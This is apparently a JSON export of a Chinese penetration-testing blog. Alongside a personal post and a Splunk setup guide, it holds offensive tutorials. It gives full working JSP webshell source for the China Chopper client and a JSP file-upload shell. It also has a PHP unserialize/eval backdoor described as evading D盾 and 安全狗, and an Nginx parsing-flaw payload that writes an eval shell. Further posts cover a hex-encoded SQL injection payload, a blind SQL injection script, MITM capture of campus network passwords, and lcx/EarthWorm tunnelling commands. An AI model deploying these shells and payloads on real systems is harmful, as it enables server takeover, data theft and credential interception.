[{"title":"记录下单身结束","date":"2018-04-08T08:34:54.000Z","path":"2018/04/08/记录下单身结束/","text":"北京时间：2018/4/8 03:37纽约时间：2018/4/7 15:37 前几天还被朋友说你天天熬夜，难怪没有女票我说那我找个和我生物钟差不多的，啊哈哈哈日夜颠倒的日子，本以为在实习前是不会恋爱，结果….. 不轻易开始，不轻易分开离上一段感情结束刚刚好两年，这期间没想过恋爱，也许是没遇上对的人连异地恋都没试过的我，一下就来个异国恋，啊哈哈哈 虽然不知道结果是怎样，但居然开始了就不是玩玩而已小姐姐还是个女黑客，自己都不敢相信。哇咔咔！！！","tags":[]},{"title":"反序列化小马","date":"2018-04-05T04:48:18.000Z","path":"2018/04/05/反序列化小马/","text":"最近看到一个很有趣的文件，php反序列化 下面这段代码也不能是小马，只能说是一个反序列化漏洞的php代码，但是他也可以当小马来用用D盾等检测的时候只能检测出是反序列文件如果这段代码用魔法函数，加密，等加以改良，分分钟绕过D盾，安全狗 123456789101112&lt;?phpclass A&#123; var $test = \"demo\"; function __destruct()&#123; @eval($this-&gt;test); &#125;&#125;$test = $_POST['test'];$len = strlen($test)+1;$pp = \"O:1:\\\"A\\\":1:&#123;s:4:\\\"test\\\";s:\".$len.\":\\\"\".$test.\";\\\";&#125;\"; // 构造序列化对象$test_unser = unserialize($pp); // 反序列化同时触发_destruct函数?&gt; 执行cmdphpinfo()；whoami 菜刀连接","tags":[]},{"title":"splunk日记分析系统","date":"2018-03-24T05:49:48.000Z","path":"2018/03/24/splunk日记分析系统/","text":"简介Splunk 是机器数据的引擎。 使用Splunk可收集、索引和利用所有应用程序、服务器和设备（物理、虚拟和云中）生成的快速移动型计算机数据 。从一个位置 搜索并分析所有实时和历史数据。 使用 Splunking处理计算机数据，可让您在几分钟内（而不是几个小时或几天）解决问题和调查安全事件。监视您的端对端基础结构，避免服务性能降低或中断。以较低成本满足合规性要求，关联并分析跨越多个系统简单来说：将所有服务器日记信息实时转发到splunk服务器进行储存，这样就算服务器的日记文件被恶意删除，也不会影响到日记分析或取证。也可以创建规则，当服务器有恶意扫描时候触发警报，这对运维应急响应人员有很大的帮助 准备工作安装包两个splunk服务器端最好搭建在linux上服务器端linux：splunk-6.4.3-linux-x86_64.tgz客户端(forwarder)windows:splunkforwarder-6.4.3-x64-release.msilinux：splunkforwarder-6.4.3-linux-x86_64.tgz 下载地址：官网https://www.splunk.com/ 要先注册 部署服务器：在centos7部署splunk服务器时防止数据接收失败，为了服务端的正常运行需要关闭防火墙，还有selinux centos 7 的防火墙是firewalld不是iptables1service firewalld stop selinux 123456789sestatus -v 查看seliunx状态setenforce 0 临时关闭 selinux永久关闭/etc/selinux/configselinux =enforcing 改成 disabled 需要重启 0X01先把安装包拉到usr文件夹进行解压0X02进入splunk目录的bin启动服务0X03splunk安装之后开启Splunk Web端口8000。Splunkd端口8089端为管理端口。安装之后我们可以在浏览器中访问splunk 8000端口的WEB界面。http://127.0.0.1：8000进入splunk默认的管理员为：admin 、密码为changeme。第一登录便会强制要求修改密码0X04 12345splunk enable boot-start 设置开机启动splunk status 查看splunk状态和版本信息ps -f | grep splunk 查看进程相关信息 客户端(forwarder):windows：0x01打开msi文件选择customize0x02选择安装路径0x03直接下一步0x04下一步0x05选择需要转发的系统文件，如果选择项没有eg：tomcat访问日记，直接人工选择路径0x06这里直接填写本地ip和8089端口0x07填写splunk的ip，端口9997 linux： 将forwarder解压出来进入文件夹的bin/目录12345678910111213141516171819cd bin/./splunk start./splunk enable boot-start 设置开机启动 ps aux |grep splunk./splunk add forward-server ip:端口 添加转发服务器./splunk add forward-server ip:端口 -auth admin:password./splunk add monitor /home/log/access.log 添加内容./ splunk list add monitor /home 监控整个目录./splunk list forward-server 查看splunk的转发情况./splunk list monitor 显示那些被监控","tags":[{"name":"splunk","slug":"splunk","permalink":"http://yoursite.com/tags/splunk/"}]},{"title":"天翼上网账号抓取","date":"2018-03-23T03:15:56.000Z","path":"2018/03/23/天翼上网账号抓取/","text":"最近这些天比较忙，没时间更新。还要搭建splunk日记分析系统，把所有的服务器的日记都转发到splunk。 前奏谁还没有一点黑历史，刚上大学的时候，只开了两个月的网，就尝试各种绕过机制去上网。直到去年六月份开始在学校做渗透，才重新把以前的漏洞复现提交上去，有n+1绕过上网的方法，下面介绍其中一种。 0x01首先使用软件扫描IP段,发现网关是隐藏的使用ping命令ping网关,网关才显示出来下面使用中间人攻击网关，使经过网关的数据都要经过自己电脑 0x02再者我们用wireshark抓包,分析数据包只要在我攻击的这个时间去上网登录天翼账号的都会被我截取到账号密码 0x03整个过程难点都在于数据分析和过滤至于过滤条件就不放出来了有兴趣自己去研究 声明：只供学习交流，切勿尝试违法行为","tags":[]},{"title":"内网端口转发","date":"2018-02-26T08:48:26.000Z","path":"2018/02/26/内网端口映射/","text":"什么情况下需要端口转发：WEB服务器在内网中，远程桌面无法连接，需要进行端口转发。当内网IP的80端口通过端口映射到外网IP的80端口上， 内网的WEB服务器通过外网IP反向代理，这个情况下需要进行端口转发。 常用的端口转发工具有： lcx EathWorm reGeorg nc ssocket Tunna lcx.exe三个功能：12345-listen &lt;ConnectPort&gt; &lt;TransmitPort&gt; 端口监听-tran &lt;ConnectPort&gt; &lt;TransmitHost&gt; &lt;TransmitPort&gt; 端口映射-slave &lt;ConnectHost&gt; &lt;ConnectPort&gt; &lt;TransmitHost&gt;&lt;TransmitPort&gt; 端口转发 端口转发：需要-listen和-slave配合使用首先要有一台有独立的外网ip地址的主机和一台内网主机 命令格式 内网主机: lcx.exe -slave [外网ip地址] [需要转发到外网ip的端口] [内网ip地址] [需要转发的端口]外网主机: lcx.exe -listen [转发到外网的端口] [在外网监听的端口] 演示： 第一步：内网主机执行命令 lcx.exe -slave 114.67.233.234 333 192.168.0.105 3389 将192.168.0.105的3389端口转发到114.67.233.234的333端口第二步：外网主机执行命令 lcx.exe -listen 333 444打开mstsc使用114.67.233.234:444连接 端口映射eg：将3389端口映射到777端口执行命令：lcx.exe -tran 777 127.0.0.1 3389 Earthworm ew来建立正向代理、反向代理、多级级联，非常强大 该工具共有 6 种命令格式（ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran） 演示：第一步:外网主机执行命令：ew_for_win.exe -s rcsocks -l 1080 -e 1234第二步：内网主机执行命令: ew_for_win.exe -s rssocks -d 114.67.233.234 -e 1234在内网主机上启动SOCKSv5服务并反弹到公网主机的1234端口第三步：使用Proxifier添加代理114.67.233.234端口1080第四步：添加代理规则，让mstsc使用代理(当然我们也可以直接设置全局代理)第五步：打开mstsc连接192.168.0.105","tags":[{"name":"端口转发","slug":"端口转发","permalink":"http://yoursite.com/tags/端口转发/"}]},{"title":"python模拟登陆github","date":"2018-02-13T17:58:24.000Z","path":"2018/02/14/python模拟登陆github/","text":"用python写模拟登陆的时候我们要先去了解网站的登录机制 github登录机制当我们访问https://github.com/login时候会返回一个authenticity_token这个token值是随机的，会在https://github.com/session模拟登陆的时候用到记得dvwa的暴力破解(高级)也是每刷新一次生成一个token当我们模拟登陆成功后状态码为302(重定向) 123456789101112131415161718192021222324252627282930313233import requestsfrom bs4 import BeautifulSoupcon = requests.session() #模拟登陆必须用到session功能url1 = \"https://github.com/login\" #获取token的地址url2 = \"https://github.com/session\" #模拟登陆网址#这里是我设置的burpsuite代理，主要是用来观察python的请求和返回值proxies=&#123; \"http\":\"http:127.0.0.1:8080\", \"https\":\"http:127.0.0.1:8080\"&#125;#获取token值def gettoken(url1): html = con.get(url1,proxies=proxies,verify=False).text.encode('utf-8') soup = BeautifulSoup(html,'html.parser') token = str(soup.find_all('input')[1]['value']) print 'authenticity_token = '+ token return token#模拟登陆def main(url): token = gettoken(url1) data =&#123; 'commit':'Sign+in', 'utf8':'%E2%9C%93', 'authenticity_token':token, #这里的data构建我们可以看数据包 'login':'937169724@qq.com', 'password':'马赛克'&#125; print con.post(url,data=data,proxies=proxies,verify=False)if __name__ == \"__main__\": main(url2)","tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"模拟登陆","slug":"模拟登陆","permalink":"http://yoursite.com/tags/模拟登陆/"}]},{"title":"JSP小马上传","date":"2018-01-28T20:02:27.000Z","path":"2018/01/29/JSP小马上传/","text":"传统小马只支持上传大马等文本文件,我们一般都是先把大马传到服务器,然后再上传cmd.exe或pr.exe等等其它相关提权工具,又或者直接上传木马.但是有时候,我们根本就无法上传WebShell大马,或者说传过去功能爆废了.特别是Struts2环境,大家应该深有感悟。碰到好多,只能传那个普通的一句话小马，但是要传个大马啥的,基本上全都废了。 基本信息获取webpath：D:\\tomcat7\\webapps\\cms\\ 就是网站更目录遇到直接上传jsp菜刀连接马``jsp大马上传失败的时候这时候我们可以先上传一个jsp上传马 然后再上传jsp大马 在没上传shell成功之前，可以使用tree /f命令来看目录结构 上传马123&lt;% if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.getRealPath(\"\\\")+request.getParameter(\"f\"))).write(request.getParameter(\"t\").getBytes()); %&gt; 使用方法：http://localhost/shangchuanma.jsp?f=dama.jsp&amp;t=hello然后:在更目录下生成一个dama.jsp文件，内容为 hello …..原理就是使用get传递代码在根目录生成文件 菜刀连接马1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%&gt;&lt;%!String Pwd=\"sky\";String EC(String s,String c)throws Exception&#123;return s;&#125;//new String(s.getBytes(\"ISO-8859-1\"),c);&#125;Connection GC(String s)throws Exception&#123;String[] x=s.trim().split(\"\\r\\n\");Class.forName(x[0].trim()).newInstance();Connection c=DriverManager.getConnection(x[1].trim());if(x.length&gt;2)&#123;c.setCatalog(x[2].trim());&#125;return c;&#125;void AA(StringBuffer sb)throws Exception&#123;File r[]=File.listRoots();for(int i=0;i&lt;r.length;i++)&#123;sb.append(r[i].toString().substring(0,2));&#125;&#125;void BB(String s,StringBuffer sb)throws Exception&#123;File oF=new File(s),l[]=oF.listFiles();String sT, sQ,sF=\"\";java.util.Date dt;SimpleDateFormat fm=new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");for(int i=0;i&lt;l.length;i++)&#123;dt=new java.util.Date(l[i].lastModified());sT=fm.format(dt);sQ=l[i].canRead()?\"R\":\"\";sQ+=l[i].canWrite()?\" W\":\"\";if(l[i].isDirectory())&#123;sb.append(l[i].getName()+\"/\\t\"+sT+\"\\t\"+l[i].length()+\"\\t\"+sQ+\"\\n\");&#125;else&#123;sF+=l[i].getName()+\"\\t\"+sT+\"\\t\"+l[i].length()+\"\\t\"+sQ+\"\\n\";&#125;&#125;sb.append(sF);&#125;void EE(String s)throws Exception&#123;File f=new File(s);if(f.isDirectory())&#123;File x[]=f.listFiles();for(int k=0;k&lt;x.length;k++)&#123;if(!x[k].delete())&#123;EE(x[k].getPath());&#125;&#125;&#125;f.delete();&#125;void FF(String s,HttpServletResponse r)throws Exception&#123;int n;byte[] b=new byte[512];r.reset();ServletOutputStream os=r.getOutputStream();BufferedInputStream is=new BufferedInputStream(new FileInputStream(s));os.write((\"-&gt;\"+\"|\").getBytes(),0,3);while((n=is.read(b,0,512))!=-1)&#123;os.write(b,0,n);&#125;os.write((\"|\"+\"&lt;-\").getBytes(),0,3);os.close();is.close();&#125;void GG(String s, String d)throws Exception&#123;String h=\"0123456789ABCDEF\";int n;File f=new File(s);f.createNewFile();FileOutputStream os=new FileOutputStream(f);for(int i=0;i&lt;d.length();i+=2)&#123;os.write((h.indexOf(d.charAt(i))&lt;&lt;4|h.indexOf(d.charAt(i+1))));&#125;os.close();&#125;void HH(String s,String d)throws Exception&#123;File sf=new File(s),df=new File(d);if(sf.isDirectory())&#123;if(!df.exists())&#123;df.mkdir();&#125;File z[]=sf.listFiles();for(int j=0;j&lt;z.length;j++)&#123;HH(s+\"/\"+z[j].getName(),d+\"/\"+z[j].getName());&#125;&#125;else&#123;FileInputStream is=new FileInputStream(sf);FileOutputStream os=new FileOutputStream(df);int n;byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1)&#123;os.write(b,0,n);&#125;is.close();os.close();&#125;&#125;void II(String s,String d)throws Exception&#123;File sf=new File(s),df=new File(d);sf.renameTo(df);&#125;void JJ(String s)throws Exception&#123;File f=new File(s);f.mkdir();&#125;void KK(String s,String t)throws Exception&#123;File f=new File(s);SimpleDateFormat fm=new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");java.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());&#125;void LL(String s, String d)throws Exception&#123;URL u=new URL(s);int n;FileOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection)u.openConnection();InputStream is=h.getInputStream();byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1)&#123;os.write(b,0,n);&#125;os.close();is.close();h.disconnect();&#125;void MM(InputStream is, StringBuffer sb)throws Exception&#123;String l;BufferedReader br=new BufferedReader(new InputStreamReader(is));while((l=br.readLine())!=null)&#123;sb.append(l+\"\\r\\n\");&#125;&#125;void NN(String s,StringBuffer sb)throws Exception&#123;Connection c=GC(s);ResultSet r=c.getMetaData().getCatalogs();while(r.next())&#123;sb.append(r.getString(1)+\"\\t\");&#125;r.close();c.close();&#125;void OO(String s,StringBuffer sb)throws Exception&#123;Connection c=GC(s);String[] t=&#123;\"TABLE\"&#125;;ResultSet r=c.getMetaData().getTables (null,null,\"%\",t);while(r.next())&#123;sb.append(r.getString(\"TABLE_NAME\")+\"\\t\");&#125;r.close();c.close();&#125;void PP(String s,StringBuffer sb)throws Exception&#123;String[] x=s.trim().split(\"\\r\\n\");Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(\"select * from \"+x[3]);ResultSetMetaData d=r.getMetaData();for(int i=1;i&lt;=d.getColumnCount();i++)&#123;sb.append(d.getColumnName(i)+\" (\"+d.getColumnTypeName(i)+\")\\t\");&#125;r.close();m.close();c.close();&#125;void QQ(String cs,String s,String q,StringBuffer sb)throws Exception&#123;int i;Connection c=GC(s);Statement m=c.createStatement(1005,1008);try&#123;ResultSet r=m.executeQuery(q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(i=1;i&lt;=n;i++)&#123;sb.append(d.getColumnName(i)+\"\\t|\\t\");&#125;sb.append(\"\\r\\n\");while(r.next())&#123;for(i=1;i&lt;=n;i++)&#123;sb.append(EC(r.getString(i),cs)+\"\\t|\\t\");&#125;sb.append(\"\\r\\n\");&#125;r.close();&#125;catch(Exception e)&#123;sb.append(\"Result\\t|\\t\\r\\n\");try&#123;m.executeUpdate(q);sb.append(\"Execute Successfully!\\t|\\t\\r\\n\");&#125;catch(Exception ee)&#123;sb.append(ee.toString()+\"\\t|\\t\\r\\n\");&#125;&#125;m.close();c.close();&#125;%&gt;&lt;%String cs=request.getParameter(\"z0\")+\"\";request.setCharacterEncoding(cs);response.setContentType(\"text/html;charset=\"+cs);String Z=EC(request.getParameter(Pwd)+\"\",cs);String z1=EC(request.getParameter(\"z1\")+\"\",cs);String z2=EC(request.getParameter(\"z2\")+\"\",cs);StringBuffer sb=new StringBuffer(\"\");try&#123;sb.append(\"-&gt;\"+\"|\");if(Z.equals(\"A\"))&#123;String s=new File(application.getRealPath(request.getRequestURI())).getParent();sb.append(s+\"\\t\");if(!s.substring(0,1).equals(\"/\"))&#123;AA(sb);&#125;&#125;else if(Z.equals(\"B\"))&#123;BB(z1,sb);&#125;else if(Z.equals(\"C\"))&#123;String l=\"\";BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));while((l=br.readLine())!=null)&#123;sb.append(l+\"\\r\\n\");&#125;br.close();&#125;else if(Z.equals(\"D\"))&#123;BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));bw.write(z2);bw.close();sb.append(\"1\");&#125;else if(Z.equals(\"E\"))&#123;EE(z1);sb.append(\"1\");&#125;else if(Z.equals(\"F\"))&#123;FF(z1,response);&#125;else if(Z.equals(\"G\"))&#123;GG(z1,z2);sb.append(\"1\");&#125;else if(Z.equals(\"H\"))&#123;HH(z1,z2);sb.append(\"1\");&#125;else if(Z.equals(\"I\"))&#123;II(z1,z2);sb.append(\"1\");&#125;else if(Z.equals(\"J\"))&#123;JJ(z1);sb.append(\"1\");&#125;else if(Z.equals(\"K\"))&#123;KK(z1,z2);sb.append(\"1\");&#125;else if(Z.equals(\"L\"))&#123;LL(z1,z2);sb.append(\"1\");&#125;else if(Z.equals(\"M\"))&#123;String[] c=&#123;z1.substring(2),z1.substring(0,2),z2&#125;;Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);&#125;else if(Z.equals(\"N\"))&#123;NN(z1,sb);&#125;else if(Z.equals(\"O\"))&#123;OO(z1,sb);&#125;else if(Z.equals(\"P\"))&#123;PP(z1,sb);&#125;else if(Z.equals(\"Q\"))&#123;QQ(cs,z1,z2,sb);&#125;&#125;catch(Exception e)&#123;sb.append(\"ERROR\"+\":// \"+e.toString());&#125;sb.append(\"|\"+\"&lt;-\");out.print(sb.toString());%&gt; eg:有时菜刀会解析不成功重新连接几次便可 大马 有记录，溜了溜了……","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://yoursite.com/tags/渗透测试/"},{"name":"漏洞上传","slug":"漏洞上传","permalink":"http://yoursite.com/tags/漏洞上传/"}]},{"title":"可视化sql注入","date":"2018-01-15T19:10:54.000Z","path":"2018/01/16/可视化sql注入/","text":"听到可视化sql注入这个词语是不是有点陌生能达到什么样的一个效果呢？ 前言SQLiGODS全名叫SQli Gods Syntax，实质上是一个适用于mysql数据库的concat函数。通过将联合查询注入的繁琐步骤变成网页里的一个可视化div，大大简化了手注帝们联合查询时编码解码的步骤，省时省力。 效果图我们可以看到database里所有的表都会显示在div框架里面这样我们的可视度就变高了很多 实现适用条件:能够回显的联合查询注入点eg：dvwa的注入漏洞 select 1,2 -- +1和2都能回显我们直接将下面代码代入到1或2中 1concat(0x3c7363726970743e6e616d653d70726f6d70742822506c6561736520456e74657220596f7572204e616d65203a2022293b2075726c3d70726f6d70742822506c6561736520456e746572205468652055726c20796f7527726520747279696e6720746f20496e6a65637420616e6420777269746520276d616b6d616e2720617420796f757220496e6a656374696f6e20506f696e742c204578616d706c65203a20687474703a2f2f736974652e636f6d2f66696c652e7068703f69643d2d3420554e494f4e2053454c45435420312c322c332c636f6e6361742830783664363136622c6d616b6d616e292c352d2d2b2d204e4f5445203a204a757374207265706c61636520796f757220496e6a656374696f6e20706f696e742077697468206b6579776f726420276d616b6d616e2722293b3c2f7363726970743e,0x3c623e3c666f6e7420636f6c6f723d7265643e53514c69474f44732053796e746178205620312e30204279204d616b4d616e3c2f666f6e743e3c62723e3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d343e496e6a6563746564206279203c7363726970743e646f63756d656e742e7772697465286e616d65293b3c2f7363726970743e3c2f666f6e743e3c62723e3c7461626c6520626f726465723d2231223e3c74723e3c74643e44422056657273696f6e203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,version(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e2044422055736572203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,user(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e5072696d617279204442203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,database(),0x203c2f74643e3c2f74723e3c2f7461626c653e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e43686f6f73652061207461626c652066726f6d207468652064726f70646f776e206d656e75203a203c2f666f6e743e3c62723e,concat(0x3c7363726970743e66756e6374696f6e20746f48657828737472297b76617220686578203d27273b666f722876617220693d303b693c7374722e6c656e6774683b692b2b297b686578202b3d2027272b7374722e63686172436f646541742869292e746f537472696e67283136293b7d72657475726e206865783b7d66756e6374696f6e2072656469726563742873697465297b6d616b73706c69743d736974652e73706c697428222e22293b64626e616d653d6d616b73706c69745b305d3b74626c6e616d653d6d616b73706c69745b315d3b6d616b7265703d22636f6e636174284946284074626c3a3d3078222b746f4865782874626c6e616d65292b222c3078302c307830292c4946284064623a3d3078222b746f4865782864626e616d65292b222c3078302c307830292c636f6e6361742830783363373336333732363937303734336537353732366333643232222b746f4865782875726c292b2232323362336332663733363337323639373037343365292c636f6e63617428636f6e6361742830783363373336333732363937303734336536343632336432322c4064622c307832323362373436323663336432322c4074626c2c3078323233623363326637333633373236393730373433652c30783363363233653363363636663665373432303633366636633666373233643732363536343365323035333531346336393437346634343733323035333739366537343631373832303536323033313265333032303432373932303464363136623464363136653363326636363666366537343365336336323732336533633632373233653534363136323663363532303465363136643635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4074626c2c3078336332663636366636653734336532303636373236663664323036343631373436313632363137333635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4064622c307833633266363636663665373433653363363237323365346537353664363236353732323034663636323034333666366337353664366537333230336132303363363636663665373432303633366636633666373233643632366337353635336533633733363337323639373037343365363336663663363336653734336432322c2853454c45435420636f756e7428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f736368656d613d40646220616e64207461626c655f6e616d653d4074626c292c3078323233623634366636333735366436353665373432653737373236393734363532383633366636633633366537343239336233633266373336333732363937303734336533633266363636663665373433652c307833633632373233652c2873656c65637420284078292066726f6d202873656c656374202840783a3d30783030292c284063686b3a3d31292c202873656c656374202830292066726f6d2028696e666f726d6174696f6e5f736368656d612e636f6c756d6e732920776865726520287461626c655f736368656d613d3078222b746f4865782864626e616d65292b222920616e6420287461626c655f6e616d653d3078222b746f4865782874626c6e616d65292b222920616e642028307830302920696e202840783a3d636f6e6361745f777328307832302c40782c4946284063686b3d312c30783363373336333732363937303734336532303633366636633665363136643635323033643230366536353737323034313732373236313739323832393362323037363631373232303639323033643230333133622c30783230292c30783230363336663663366536313664363535623639356432303364323032322c636f6c756d6e5f6e616d652c307832323362323036393262326233622c4946284063686b3a3d322c307832302c30783230292929292978292c30783636366637323238363933643331336236393363336436333666366336333665373433623639326232623239376236343666363337353664363536653734326537373732363937343635323832323363363636663665373432303633366636633666373233643637373236353635366533653232326236393262323232653230336332663636366636653734336532323262363336663663366536313664363535623639356432623232336336323732336532323239336237643363326637333633373236393730373433652c636f6e6361742830783363363233652c307833633733363337323639373037343365373137353635373237393364323232323362363636663732323836393364333133623639336336333666366336333665373433623639326232623239376237313735363537323739336437313735363537323739326236333666366336653631366436353562363935643262323232633330373833323330333336313333363133323330326332323362376437353732366333643735373236633265373236353730366336313633363532383232323732323263323232353332333732323239336236343664373037313735363537323739336437353732366332653732363537303663363136333635323832323664363136623664363136653232326332323238373336353663363536333734323834303239323036363732366636643238373336353663363536333734323834303361336433303738333033303239323032633238373336353663363536333734323032383430323932303636373236663664323832323262363436323262323232653232326237343632366332623232323937373638363537323635323834303239323036393665323032383430336133643633366636653633363137343566373737333238333037383332333032633430326332323262373137353635373237393262323233303738333336333336333233373332333336353239323932393239363132393232323933623634366636333735366436353665373432653737373236393734363532383232336336313230363837323635363633643237323232623634366437303731373536353732373932623232323733653433366336393633366232303438363537323635323037343666323034343735366437303230373436383639373332303737363836663663363532303534363136323663363533633631336532323239336233633266373336333732363937303734336529292929223b75726c3d75726c2e7265706c616365282227222c2225323722293b75726c706173313d75726c2e7265706c61636528226d616b6d616e222c6d616b726570293b77696e646f772e6f70656e2875726c70617331293b7d3c2f7363726970743e3c73656c656374206f6e6368616e67653d22726564697265637428746869732e76616c756529223e3c6f7074696f6e2076616c75653d226d6b6e6f6e65222073656c65637465643e43686f6f73652061205461626c653c2f6f7074696f6e3e,(select (@x) from (select (@x:=0x00), (select (0) from (information_schema.tables) where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00) in (@x:=concat(@x,0x3c6f7074696f6e2076616c75653d22,UNHEX(HEX(table_schema)),0x2e,UNHEX(HEX(table_name)),0x223e,UNHEX(HEX(concat(0x4461746162617365203a3a20,table_schema,0x203a3a205461626c65203a3a20,table_name))),0x3c2f6f7074696f6e3e))))x),0x3c2f73656c6563743e),0x3c62723e3c62723e3c62723e3c62723e3c62723e)","tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://yoursite.com/tags/sql注入/"}]},{"title":"web解析漏洞","date":"2018-01-15T00:02:41.000Z","path":"2018/01/15/web解析漏洞/","text":"解析漏洞有什么用么？在我们遇到上传漏洞的时候我们上传shell成功了，但是这个shell却不能被解析，这个时候我们就要借助服务器的解析漏洞来对他进行解析。 IIS 版本的规律IIS 6.0 → server 2003 IIS 7.0 → server 2008 IIS 7.5 → server 2008 r2 IIS 8.0 → server 2012 如何快速分辨是Linux/windows系统的站点Linux 区分大小写，windows 不区分，利用这个规律,例如访问:1http://192.168.0.1/admin.php 尝试把 admin.php 中 a , 换成大写 A 访问，如果不报错证明是 windows 平台。 IIS 6.0解析漏洞1.目录解析/xx.asp/xx.jpg在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。例如创建目录sp.asp，那么/sp.asp/1.jpg将被当作asp文件来执行。假设黑阔可以控制上传文件夹路径,就可以不管你上传后你的图片改不改名都能拿shell了。2.文件解析sp.asp;.jpg在IIS6.0下，分号后面的不被解析，也就是说sp.asp;.jpg会被服务器看成是sp.asp还有IIS6.0 默认的可执行文件除了asp还包含这三种/sp.asa/sp.cer/sp.cdx IIS 7.0/IIS 7.5/ Nginx &lt;8.03畸形解析漏洞Nginx解析漏洞这个伟大的漏洞是我国安全组织80sec发现的…在默认Fast-CGI开启状况下,黑阔上传一个名字为sp.jpg，内容为1&lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[cmd])?&gt;&apos;);?&gt; 的文件，然后访问sp.jpg/.php,在这个目录下就会生成一句话木马 shell.phpIIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。 Nginx &lt;8.03 空字节代码执行漏洞影响版:0.5.x,0.6.x, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37Nginx在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码 apache解析漏洞apache识别文件的类型是从右往左是别的，如果遇到不认识的扩展名会向前一个识别,直到遇到能识别的扩展名。能上传jpg文件，而不能上传php文件,直接test.php加成test.php.abc（abc位置可加任何apache不解析的后缀）这样apache就直接解析成test.php","tags":[]},{"title":"SQL injection(布尔盲注)","date":"2018-01-07T19:20:33.000Z","path":"2018/01/08/SQL-injection-布尔盲注/","text":"最喜欢深夜的感觉，安安静静的！！！什么？？喜欢深夜？怪不得还是单身狗 知识扫盲length(str)：返回字符串str的长度substr(str,pos,len)：将str从pos位置开始截取len长度的字符返回，需要注意的是这里pos的是从1开始的mid(str,pos,len)：和substr()类似ascii(str)：返回字符串str最左边的acsii码（即首字母的acsii码）ord()：同上，返回acsii码left(str,len)：对字符串str左截取len长度right(str,len)：对字符串str右截取len长度if(a,b,c)：条件判断，如果a为true，返回b，否则返回c 盲注有个固定式：and ascii(substr(A,1,1))&gt;B，或者and if(ascii(substr(A,1,1))&gt;B,1,0)，这里的A通常是一个select语句，B则是字符或数字的ascii码，他们的中心思想都是通过substr等截取函数以二分法的形式查询逐个匹配想要的信息，这个过程通常都很耗时，所以建议直接写个盲注脚本来跑 用最简单的方法实现盲注脚本猜测数据库名长度：&#39; and length((select database()))=%d -- +查询数据库名:&#39; and ascii(substr((select database()),%d,1))&gt;%d-- +查询表数量：&#39;and (select count(table_name) from information_schema.tables where table_schema=&#39;%s&#39;)&gt;%d -- +猜测表长度：&#39;and (select length(table_name) from information_schema.tables where table_schema=&#39;%s&#39; limit %d,1)=%d -- +查询表名:&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;%s&#39; limit %d,1),%d,1))&gt;%d-- +查询users表列数&#39;and (select count(*) from users)=%d -- +查询users表字段位数&#39;and (select length(username) from users limit %d,1)=%d --+脱裤：&#39;and ascii(substr((select username from users limit %d,1),%d,1))=%d --+ 尝试 1&apos; and ascii(substr((select database()),1,1))=115 --+ 上面这句意思是将数据库名左边第一位字母转换成ascii码然后和115对比，如果这个结果为ture，则返回正常页面，这里数据库名为：security 第一位s转换成ascii码也就是115，所以这里返回正常页面1&apos; and ascii(substr((select database()),1,1))=114 --+ 这里ascii码114为r，和115对比，结果为false，返回错误页面 在脚本中我们有两个方法判断是否返回正确页面1.根据错误页面和正确页面的多出来的文字 eg:像上述页面的you are in…………2.根据页面字符返回的长度 python里可以用len(requests.get(url).content)判断 使用python编写盲注入脚本本文用到的是最适合初学者写的方法不要问为什么不用二分法来就算，为什么不写成模块，大鸟飞过~~~这次只用到了python的一个模板requests，两个语句for，if123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104# -*-coding:utf-8-*- import requestssuccess = \"You are in\" #用来判断是否返回正常页面database = \"\"tablename = \"\"columns = \"\"username= \"\"password= \"\"#获取数据库名长度for dblength in range(1,200): url = \"http://localhost/sqli-labs-master/Less-8/?id=1' and length((select database()))&gt;%d -- +\" %(dblength) if success not in requests.get(url).content: print \"DBlength :\" + str(dblength) break#获取数据库名for u in range(1,dblength+1): for i in range(33,126): url = \"http://localhost/sqli-labs-master/Less-8/?id=1' and ascii(substr((select database()),%d,1))&gt;%d-- +\" %(u,i) if success not in requests.get(url).content: database += chr(i) breakprint \"database name is:\"+ database#获取表的数量for table_number in range(1,200): url= \"http://localhost/sqli-labs-master/Less-8/?id=1'and (select count(table_name) from 